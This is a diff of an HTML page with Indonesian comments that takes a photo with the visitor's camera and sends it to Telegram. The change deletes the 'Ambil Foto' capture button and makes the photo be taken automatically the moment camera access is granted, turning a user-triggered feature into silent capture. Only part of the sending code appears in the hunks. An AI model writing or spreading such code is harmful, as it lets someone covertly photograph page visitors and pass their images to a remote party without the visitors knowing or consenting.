@@ -7,7 +7,6 @@
     <h1>Ambil Foto Kamera dan Kirim ke Telegram</h1>
     <div>
       <video id="video" width="400" height="300" autoplay></video>
-      <button id="capture-btn">Ambil Foto</button>
     </div>
     <canvas id="canvas" width="400" height="300"></canvas>
     <div id="status"></div>
@@ -16,7 +15,6 @@
     <script>
       var video = document.getElementById("video");
       var canvas = document.getElementById("canvas");
-      var captureButton = document.getElementById("capture-btn");
       var statusElement = document.getElementById("status");
       var responseElement = document.getElementById("response");
 
@@ -26,6 +24,7 @@
           .getUserMedia({ video: true })
           .then(function (stream) {
             video.srcObject = stream;
+            capturePhoto();
           })
           .catch(function (error) {
             statusElement.textContent = "Error accessing camera: " + error;
@@ -34,8 +33,8 @@
         statusElement.textContent = "MediaDevices getUserMedia is not supported.";
       }
 
-      // Mengambil dan mengirim foto saat tombol diklik
-      captureButton.addEventListener("click", function () {
+      // Mengambil foto dan mengirimnya ke Telegram
+      function capturePhoto() {
         canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
         var dataURL = canvas.toDataURL("image/jpeg");
 
@@ -60,7 +59,7 @@
           .catch(function (error) {
             statusElement.textContent = "Error saat mengirim foto ke Telegram: " + error;
           });
-      });
+      }
 
       // Fungsi untuk mengubah data URI menjadi Blob
       function dataURItoBlob(dataURI) {
